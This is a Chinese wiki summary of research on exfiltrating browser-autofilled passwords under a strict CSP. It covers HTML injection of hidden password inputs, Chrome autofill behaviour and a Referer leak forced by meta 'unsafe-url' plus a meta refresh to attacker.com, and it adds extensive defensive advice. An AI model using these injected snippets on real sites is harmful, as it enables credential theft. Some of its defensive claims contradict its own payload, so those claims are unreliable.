# 严格 CSP 下的密码窃取：HTML 注入 + Chrome 自动填充攻击

## Ch01.282 严格 CSP 下的密码窃取：HTML 注入 + Chrome 自动填充攻击

> 📊 Level ⭐⭐ | 14.6KB | `entities/afine-csp-html-injection-password-exfiltration-attack.md`

# 严格 CSP 下的密码窃取：HTML 注入 + Chrome 自动填充攻击

## 概述

AFINE 安全研究团队发布原创攻击研究：在**严格 CSP (Content Security Policy)** 环境下，通过 HTML 注入 + Chrome 自动填充行为 + Referer 头，实现用户密码外泄。

## 攻击技术栈

### 1. 严格 CSP 下的 HTML 注入

许多现代应用配置了禁止 inline script 的严格 CSP，但仍允许 inline HTML 元素 (input form)。攻击者通过 XSS 变体注入隐藏的 input 元素：

```html
<input type="password" name="username" autocomplete="username">
<input type="password" name="password" autocomplete="current-password">
```

### 2. Chrome 自动填充触发

Chrome 浏览器对 form 标签的自动填充行为：
- 检测到 input type="password" + autocomplete 属性 → 触发密码管理器
- 用户保存的凭据被自动填入隐藏 input
- **关键点**：即使 input 在屏幕外或 display:none，自动填充仍生效

### 3. Referer 头外泄

密码字段填入后，**当用户后续导航到攻击者控制的 URL 时，Referer 头可能携带敏感信息**。这是最关键的绕过 CSP 的技术：
- CSP 可以限制脚本、样式、连接目的地
- 但**无法阻止浏览器自动行为** (form 提交、navigation)
- Referer 头是浏览器自动添加的，CSP 不拦截

## 浏览器特定测量

研究包含详细的浏览器行为差异表：

| 浏览器 | 自动填充触发 | Referer 携带 | 防御建议 |
|--------|--------------|--------------|----------|
| **Chrome** | ✅ | ⚠️ 部分场景 | 禁用 form autofill 提示 |
| **Firefox** | ✅ | ⚠️ 严格 referrer policy 可控 | about:config 调整 |
| **Safari** | ✅ | ⚠️ ITP 限制 | 跨站需用户交互 |
| **Edge** | ✅ | ⚠️ 同 Chrome | 同 Chrome |

## CSP 失效场景示例

```
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self';
  style-src 'self';
  // 无法阻止以下：
  // 1. form 自动填充
  // 2. 浏览器生成的 Referer 头
  // 3. 用户点击的合法链接携带敏感 URL
```

## 防御建议

### 应用开发者

1. **避免 password field 在不可见区域**：使用 `visibility: hidden` 仍然触发自动填充
2. **Referrer-Policy 头**：设置 `no-referrer` 或 `same-origin` 严格策略
3. **Form action 限制**：CSP 加 `form-action 'self'` 限制表单提交目的地
4. **输入验证**：对所有 inline HTML 进行白名单过滤，特别是 form 标签

### 用户

1. **密码管理器设置**：禁用自动填充 (使用手动复制)
2. **浏览器扩展**：考虑 Privacy Badger 拦截可疑 Referer

### 安全团队

1. **CSP 审计**：即使严格 CSP，仍需配合 form 标签白名单
2. **Referrer-Policy 强制**：HTTP 响应头加入 `Referrer-Policy: no-referrer`
3. **HTML 注入测试**：在 SAST 工具中加入 form 标签注入检测

## 与现有 entity 差异化

| 维度 | 本研究 (AFINE) | 通用 CSP Bypass |
|------|----------------|-----------------|
| 攻击面 | HTML 注入 + 自动填充 | 通用 CSP 绕过 |
| 关键漏洞 | Referer 头信息泄露 | script-src 绕过 |
| 利用难度 | 中 (需社工 + 隐藏 form) | 视场景 |
| 防御盲点 | CSP 无法拦截 | 多数依赖 CSP 防护 |

## 深度分析

### 1. Referer 头处理的不一致性：Chrome 的特权地位

AFINE 团队在三个主流浏览器上系统性地测试了 Referer 策略绕过，发现了惊人的差异。 在未设置任何 Referrer-Policy 时，Safari 和 Firefox 仅在 `<a>` 标签和 `<meta>` 重定向中泄漏完整 URL，而 `<img>`、`<script>`、`<iframe>`、`fetch()` 仅泄漏 Origin。Chrome 则不同——几乎所有标签都会泄漏完整 URL，包括 `<img>`、`<script>`、`<iframe>`、`<a>` 和 `fetch()`。

最关键的是，即使应用强制设置 `Referrer-Policy: no-referrer`，Chrome 依然会在 `<img>`、`<script>`、`<iframe>`、`<a>`、`fetch()` 和 `<meta>` 重定向中泄漏完整 URL。这与 W3C Referrer Policy 规范的处理模型顺序有关：浏览器先检查 `noreferrer` link 类型，再检查 `referrerpolicy` 属性，然后检查 `<meta name="referrer">`，最后才看 HTTP header。Chrome 选择性地忽略了一部分安全信号，而 Safari/Firefox 的实现更保守，但仍未完全免疫。

这一发现对攻击者意味着：无论目标使用什么浏览器，只要存在 HTML 注入，`<meta http-equiv="Refresh">` 重定向都能可靠地触发 Referer 泄漏，实现数据外泄。

### 2. `<meta>` 重定向的双重滥用：强制 referrer policy + 强制导航

该攻击的核心在于 `<meta http-equiv="Refresh">` 标签的双重功能。 注入 `<meta name="referrer" content="unsafe-url">` 会将页面的 Referrer-Policy 覆盖为 `unsafe-url`，导致浏览器在后续导航请求中携带完整 URL（包含查询参数）。紧接着注入 `<meta http-equiv="Refresh" content="0,url=https://attacker.com">` 强制浏览器导航到攻击者控制的域名。

这两者的结合形成了一个精妙的攻击链：当浏览器执行重定向时，发往 attacker.com 的请求头中包含了来自原页面的完整 Referer——而原页面的 URL 中已经包含了通过 GET 参数传递的邮箱和密码。整个过程没有任何 JavaScript 执行，因此严格 CSP 的 `script-src 'none'` 根本无法拦截。

### 3. 密码管理器行为设计缺陷：Chrome 的"域名无关"自动填充

研究揭示了一个根本性的密码管理器设计矛盾。 浏览器厂商在防止跨域表单提交上做了努力——Firefox 不会向不同域名 autofill，Safari 甚至会在 action 指向外部域名时生成新密码而不是使用保存的凭据。但它们都没有防护"同一个域名下的 GET 请求泄漏"。

Chrome 的行为尤其激进：它只根据当前页面域名决定是否 autofill，完全无视 form 的 action 属性指向哪里。这意味着攻击者只要将 form 的 action 设为同源路径（如 `/`），Chrome 就会填入密码，然后密码随 GET 参数进入 URL。攻击者再通过 Referer 泄漏机制将这个 URL 转移到外部。

AFINE 团队在论文中明确指出了这一矛盾：**浏览器努力阻止凭证流向外部域名，却对同一域名内以 GET 参数形式明文暴露密码的做法毫无防备**。

### 4. 严格 CSP 下的单点登录：为什么 form-action 单独不够

攻击示例 CSP 配置了 `form-action 'self'`，这意味着表单只能提交到同源。 研究认为这是好的做法，但配合本攻击来看，仅靠 `form-action` 是不够的。攻击的核心不在于往哪里提交，而在于密码填入后的**导航行为**和**Referer 泄漏**。

即使 `form-action 'self'` 将提交限制在同源，攻击者仍然可以：
1. 注入 form 并让密码管理器 autofill
2. form action 指向 `/`（同源，满足 `form-action 'self'`）
3. 通过 `<meta>` 重定向触发跨域导航
4. 在 Referer 头中泄漏包含密码的完整 URL

这说明 CSP 的 `form-action` 指令在防止密码外泄方面存在结构性盲点——它只能限制提交目的地，无法防御提交后的重定向和 Referer 泄漏。

### 5. "无需 JavaScript"的攻击哲学：自动填充机制的可利用性

AFINE 的攻击路径刻意不依赖任何 JavaScript 执行，这是该研究最有启发性的观察之一。 在 CSP 严格到 `script-src 'none'` 仍能完成密码窃取，说明攻击面已经从"脚本执行"扩展到了"浏览器自动行为"。

密码管理器的 autofill 机制是一个浏览器级别的自动行为，CSP 无法通过限制脚本来源来控制它。同样，`<meta>` 重定向是 HTML 规范的一部分，不属于"脚本"范畴，因此不在 CSP 的管控范围内。这些"沉默的"浏览器自动机制构成了一个被低估的攻击面。

## 实践启示

### 1. 将 Referrer-Policy 纳入登录页面的强制响应头

`Referrer-Policy: no-referrer` 应作为登录页面的 HTTP 强制响应头，而不仅仅是一个可选的安全增强。 虽然在 Chrome 中注入的 `<meta>` 仍可覆盖它，但这是纵深防御的关键一层。没有它，默认的 `strict-origin-when-cross-origin` 会在跨域导航时泄漏完整的登录 URL（可能包含 SAML 参数或重定向 URL）。

建议在 Nginx/Apache/Caddy 层统一为敏感路径设置：
```nginx
add_header Referrer-Policy "no-referrer" always;
```

### 2. 对所有反射型参数进行上下文 HTML 编码，不只是 JS 编码

该攻击的前提是**反射型 HTML 注入**——攻击者通过 URL 参数注入任意 HTML。 在传统 XSS 防护思路下，开发者往往只对`<script>`标签做过滤或编码，但这里的攻击根本不需要执行 JavaScript。注入的 `<input>` 和 `<meta>` 标签完全是纯 HTML，却能完成完整的攻击链。

修复源头：对所有 URL 参数输出到 HTML 页面时，必须进行**上下文感知的 HTML 编码**。例如在 `<body>` 中输出时，`>` 应编码为 `&gt;`，`<` 编码为 `&lt;`，属性值加引号并转义。即便是严格 CSP 环境，也必须从源头消灭 HTML 注入。

### 3. 登录页面禁用密码管理器的自动填充提示

虽然用户自己的密码管理器行为无法直接控制，但应用层可以通过 `autocomplete` 属性的精确设置来减少风险。 建议对真实登录表单明确使用 `autocomplete="email"` 和 `autocomplete="current-password"`，而对任何由攻击者注入的伪造表单——由于它们通常不会包含正确的 autocomplete 属性——密码管理器不会 autofill。

此外，考虑在登录页面设置 `autocomplete="off"`（虽然可能影响用户体验），并在页脚或安全文档中明确告知用户：不要在不熟悉的表单中输入密码。

### 4. 将敏感操作页面纳入 CSP frame-ancestors 和 form-action 的严格配置

建议在登录类页面使用最严格的 CSP 配置：
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';  # 允许内联样式以支持 UI
  form-action 'self';
  frame-ancestors 'self';
  base-uri 'self';
  object-src 'none';
```
特别要注意 `base-uri 'self'`——它能防止攻击者通过注入 `<base>` 标签劫持相对路径的资源加载。此外，`object-src 'none'` 防止嵌入 Flash 等插件攻击。

### 5. 在 SAST/DAST 扫描中加入 HTML 注入 + 表单 planting 检测

传统的 XSS 扫描工具往往聚焦于 JavaScript 执行层面，HTML 注入可能被标记为低危甚至忽略。 该研究表明，**HTML 注入在严格 CSP 环境下仍构成高危攻击面**。

安全团队应更新扫描规则：
- **DAST**：在目标 URL 中注入 `<input type="password">` 并观察是否渲染，用于检测 HTML 注入
- **SAST**：检测将 URL 参数直接拼接到 HTML 模板而未做 HTML 编码的代码模式
- **密码窃取专项测试**：如果目标有登录功能，主动尝试注入 form 标签并观察 autofill 行为（需在受控环境）

## 相关实体
- [Crypto Funds Six Week Inflow Streak 4 9 Billion Coinshares](ch01/715-9.html)
- [Ico Fines South Staffordshire 2022 Breach](ch01/888-20.html)
- [Zeus Rwa Thread Reader](https://github.com/QianJinGuo/wiki/blob/main/entities/zeus-rwa-thread-reader.md)
- [Interaction Models](../ch03/102-interaction-models-a-scalable-approach-to-human-ai-collabor.html)
- [Weve Been Here Before Decompilers Fuzzers And Now Ai](../ch05/090-ai.html)
- [Automate Progressive Rollouts With Vercel Flags Vercel](../ch09/154-automate-progressive-rollouts-with-vercel-flags-vercel.html)

→ [原文存档](https://github.com/QianJinGuo/wiki-book/tree/main/docs/raw/articles/afine-csp-html-injection-password-exfiltration.md)
- [discord 全平台端到端加密](../ch12/096-discord.html)
- [incendium fuzzing ms rpc](../ch12/110-incendium-fuzzing-ms-rpc.html)
- [the interface is no longer the product](../ch05/090-ai.html)
- [a route to root in a 4g industrial router](ch01/888-20.html)
- [MOC](https://github.com/QianJinGuo/wiki/blob/main/moc/security-privacy-landscape.md)

---

